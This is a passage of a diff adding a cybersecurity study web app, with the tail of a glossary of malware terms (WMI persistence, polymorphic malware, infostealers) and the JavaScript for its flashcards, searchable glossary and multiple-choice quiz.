+  {domain:'malware',term:'WMI Persistence',hint:'Event subscriptions that survive reboots invisibly',definition:'Windows Management Instrumentation subscriptions execute code when system events fire such as startup or user login. Highly stealthy — standard tools do not list WMI subscriptions.',example:'e.g. WMI subscription that runs a PowerShell backdoor every time any user logs in'},
+  {domain:'malware',term:'Polymorphic Malware',hint:'Rewrites its own signature every infection',definition:'Malware that mutates its code signature with each infection while keeping the same functionality. Each copy produces a different hash, defeating signature-based antivirus detection.',example:'e.g. Encrypted payload with a freshly generated decryptor stub — different hash every time'},
+  {domain:'malware',term:'Infostealer',hint:'Silently harvests credentials and session data',definition:'Malware focused on collecting saved browser passwords, session cookies, crypto wallet files, and clipboard contents. Usually sold as Malware-as-a-Service on dark web forums.',example:'e.g. Redline Stealer exfiltrates Chrome passwords and Discord tokens in seconds'}
+];
+
+// ── STATE ─────────────────────────────────────────────────────────────────────
+var currentFilter = 'all';
+var filteredCards = TERMS.slice();
+var currentIndex  = 0;
+var quizQuestions = [];
+var quizIndex     = 0;
+var quizScore     = 0;
+var currentCorrectTerm = '';
+
+var domainColors  = {network:'#00bfff', web:'#ff9f43', ot:'#39ff14', malware:'#ff3366'};
+var domainLabels  = {network:'NETWORK ATTACKS', web:'WEB / APP SECURITY', ot:'OT / ICS / SCADA', malware:'MALWARE & EXPLOITS'};
+
+// ── INIT ──────────────────────────────────────────────────────────────────────
+document.getElementById('total-label').textContent = TERMS.length + ' TERMS LOADED';
+
+// Tab switching
+document.getElementById('tab-flashcards').addEventListener('click', function() { switchView('flashcards'); });
+document.getElementById('tab-glossary').addEventListener('click', function() { switchView('glossary'); });
+document.getElementById('tab-quiz').addEventListener('click', function() { switchView('quiz'); });
+
+// Flashcard controls
+document.getElementById('flashcard-wrap').addEventListener('click', flipCard);
+document.getElementById('btn-prev').addEventListener('click', prevCard);
+document.getElementById('btn-next').addEventListener('click', nextCard);
+document.getElementById('btn-shuffle').addEventListener('click', shuffleCards);
+
+// Domain filter buttons
+var filterBtns = document.querySelectorAll('.filter-btn');
+for (var i = 0; i < filterBtns.length; i++) {
+  filterBtns[i].addEventListener('click', function() {
+    setFilter(this.getAttribute('data-domain'), this);
+  });
+}
+
+// Glossary search
+document.getElementById('glossary-search').addEventListener('input', function() {
+  buildGlossary(this.value);
+});
+
+// Quiz next button
+document.getElementById('quiz-next-btn').addEventListener('click', nextQuestion);
+document.getElementById('restart-btn').addEventListener('click', startQuiz);
+
+// ── VIEWS ─────────────────────────────────────────────────────────────────────
+function switchView(view) {
+  var views = ['flashcards', 'glossary', 'quiz'];
+  for (var i = 0; i < views.length; i++) {
+    document.getElementById('view-' + views[i]).classList.remove('active');
+    document.getElementById('tab-' + views[i]).classList.remove('active');
+  }
+  document.getElementById('view-' + view).classList.add('active');
+  document.getElementById('tab-' + view).classList.add('active');
+  if (view === 'glossary') buildGlossary('');
+  if (view === 'quiz') startQuiz();
+}
+
+// ── FLASHCARDS ─────────────────────────────────────────────────────────────────
+function setFilter(domain, btn) {
+  currentFilter = domain;
+  var btns = document.querySelectorAll('.filter-btn');
+  for (var i = 0; i < btns.length; i++) btns[i].classList.remove('active');
+  btn.classList.add('active');
+  filteredCards = domain === 'all' ? TERMS.slice() : TERMS.filter(function(t) { return t.domain === domain; });
+  currentIndex = 0;
+  renderCard();
+}
+
+function renderCard() {
+  var fc = document.getElementById('flashcard');
+  fc.classList.remove('flipped');
+  var c = filteredCards[currentIndex];
+  var color = domainColors[c.domain];
+  setTimeout(function() {
+    var tag = document.getElementById('card-domain-tag');
+    tag.textContent = domainLabels[c.domain];
+    tag.style.color = color;
+    tag.style.borderColor = color;
+
+    var term = document.getElementById('card-term');
+    term.textContent = c.term;
+    term.style.color = color;
+    term.style.textShadow = '0 0 18px ' + color + '88';
+
+    document.getElementById('card-hint').textContent = c.hint;
+    document.getElementById('card-definition').textContent = c.definition;
+    document.getElementById('card-example').textContent = c.example;
+
+    var n = currentIndex + 1;
+    var t = filteredCards.length;
+    document.getElementById('card-counter').textContent =
+      (n < 10 ? '0' + n : n) + ' / ' + (t < 10 ? '0' + t : t);
+  }, 120);
+}
+
+function flipCard() {
+  document.getElementById('flashcard').classList.toggle('flipped');
+}
+
+function nextCard() {
+  currentIndex = (currentIndex + 1) % filteredCards.length;
+  renderCard();
+}
+
+function prevCard() {
+  currentIndex = (currentIndex - 1 + filteredCards.length) % filteredCards.length;
+  renderCard();
+}
+
+function shuffleCards() {
+  for (var i = filteredCards.length - 1; i > 0; i--) {
+    var j = Math.floor(Math.random() * (i + 1));
+    var tmp = filteredCards[i]; filteredCards[i] = filteredCards[j]; filteredCards[j] = tmp;
+  }
+  currentIndex = 0;
+  renderCard();
+}
+
+// ── GLOSSARY ───────────────────────────────────────────────────────────────────
+function buildGlossary(filter) {
+  var q = (filter || '').toLowerCase();
+  var container = document.getElementById('glossary-content');
+  container.innerHTML = '';
+  var domains = ['network', 'web', 'ot', 'malware'];
+  for (var d = 0; d < domains.length; d++) {
+    var domain = domains[d];
+    var items = TERMS.filter(function(t) {
+      return t.domain === domain &&
+        (t.term.toLowerCase().indexOf(q) !== -1 ||
+         t.definition.toLowerCase().indexOf(q) !== -1 ||
+         t.hint.toLowerCase().indexOf(q) !== -1);
+    });
+    if (items.length === 0) continue;
+
+    var section = document.createElement('div');
+    section.className = 'glossary-section';
+
+    var header = document.createElement('div');
+    header.className = 'section-header ' + domain;
+    header.textContent = domainLabels[domain];
+    section.appendChild(header);
+
+    var grid = document.createElement('div');
+    grid.className = 'glossary-grid';
+
+    for (var i = 0; i < items.length; i++) {
+      var item = document.createElement('div');
+      item.className = 'glossary-item';
+      var termEl = document.createElement('div');
+      termEl.className = 'g-term ' + items[i].domain;
+      termEl.textContent = items[i].term;
+      var defEl = document.createElement('div');
+      defEl.className = 'g-def';
+      defEl.textContent = items[i].definition;
+      var exEl = document.createElement('div');
+      exEl.className = 'g-example';
+      exEl.textContent = items[i].example;
+      item.appendChild(termEl);
+      item.appendChild(defEl);
+      item.appendChild(exEl);
+      grid.appendChild(item);
+    }
+    section.appendChild(grid);
+    container.appendChild(section);
+  }
+}
+
+// ── QUIZ ───────────────────────────────────────────────────────────────────────
+function startQuiz() {
+  document.getElementById('quiz-active').style.display = 'block';
+  document.getElementById('quiz-result').style.display = 'none';
+  quizScore = 0;
+  quizIndex = 0;
+  var shuffled = TERMS.slice().sort(function() { return Math.random() - 0.5; });
+  quizQuestions = shuffled.slice(0, 10);
+  renderQuestion();
+}
+
+function renderQuestion() {
+  var q = quizQuestions[quizIndex];
+  currentCorrectTerm = q.term;
+
+  document.getElementById('quiz-question').textContent = q.definition;
+  document.getElementById('quiz-feedback').style.display = 'none';
+  document.getElementById('quiz-next-btn').style.display = 'none';
+
+  var pct = Math.round(quizIndex / 10 * 100);
+  document.getElementById('quiz-progress-fill').style.width = pct + '%';
+  document.getElementById('quiz-progress-text').textContent = quizIndex + ' / 10';
+  document.getElementById('quiz-score-display').textContent = 'SCORE: ' + quizScore + ' / ' + quizIndex;
+
+  // Build wrong options
+  var pool = TERMS.filter(function(t) { return t.term !== q.term; });
+  pool.sort(function() { return Math.random() - 0.5; });
+  var wrong = pool.slice(0, 3);
+  var options = wrong.concat([q]);
+  options.sort(function() { return Math.random() - 0.5; });
+
+  var letters = ['A', 'B', 'C', 'D'];
+  var container = document.getElementById('quiz-options');
+  container.innerHTML = '';
+
+  for (var i = 0; i < options.length; i++) {
+    var btn = document.createElement('button');
+    btn.className = 'quiz-option';
+    btn.setAttribute('data-term', options[i].term);
+
+    var letterSpan = document.createElement('span');
+    letterSpan.className = 'opt-letter';
+    letterSpan.textContent = letters[i];
+
+    var labelSpan = document.createElement('span');
+    labelSpan.textContent = options[i].term;
+
+    btn.appendChild(letterSpan);
+    btn.appendChild(labelSpan);
+    btn.addEventListener('click', handleAnswer);
+    container.appendChild(btn);
+  }
+}
+
+function handleAnswer(e) {
+  var btn = e.currentTarget;
+  var chosen = btn.getAttribute('data-term');
+  var q = quizQuestions[quizIndex];
+
+  // Disable all buttons
+  var allBtns = document.querySelectorAll('.quiz-option');
+  for (var i = 0; i < allBtns.length; i++) {
+    allBtns[i].removeEventListener('click', handleAnswer);
+    allBtns[i].disabled = true;
+  }
+
+  var fb = document.getElementById('quiz-feedback');
+
+  if (chosen === q.term) {
+    btn.classList.add('correct');
+    quizScore++;
+    fb.className = 'quiz-feedback correct';
+    fb.textContent = '\u2713 CORRECT \u2014 ' + q.hint;
+  } else {
+    btn.classList.add('wrong');
+    // Highlight correct answer
+    for (var j = 0; j < allBtns.length; j++) {
+      if (allBtns[j].getAttribute('data-term') === q.term) {
+        allBtns[j].classList.add('correct');
+      }
+    }
+    fb.className = 'quiz-feedback wrong';
+    fb.textContent = '\u2717 WRONG \u2014 Answer: ' + q.term + '. ' + q.hint;
+  }
+
+  fb.style.display = 'block';
+  document.getElementById('quiz-next-btn').style.display = 'inline-block';
+}
+
+function nextQuestion() {
+  quizIndex++;
+  if (quizIndex >= 10) {
+    showResult();
+  } else {
+    renderQuestion();
+  }
+}
+
+function showResult() {
+  document.getElementById('quiz-active').style.display = 'none';
+  var result = document.getElementById('quiz-result');
+  result.style.display = 'block';
+
+  var pct = Math.round(quizScore / 10 * 100);
+  document.getElementById('result-score').textContent = pct + '%';
+  document.getElementById('quiz-progress-fill').style.width = '100%';
+  document.getElementById('quiz-progress-text').textContent = '10 / 10';
+  document.getElementById('quiz-score-display').textContent = 'SCORE: ' + quizScore + ' / 10';
+
+  var grade, color;
+  if (pct >= 90)      { grade = '// ELITE OPERATOR';  color = '#39ff14'; }
+  else if (pct >= 70) { grade = '// SKILLED ANALYST'; color = '#00f5ff'; }
+  else if (pct >= 50) { grade = '// KEEP TRAINING';   color = '#ff9f43'; }
+  else                { grade = '// BACK TO BASICS';  color = '#ff3366'; }
+
+  var el = document.getElementById('result-grade');
+  el.textContent = grade;
+  el.style.color = color;
+}
+
+// ── START ─────────────────────────────────────────────────────────────────────
+renderCard();
+</script>
+</body>
+</html>
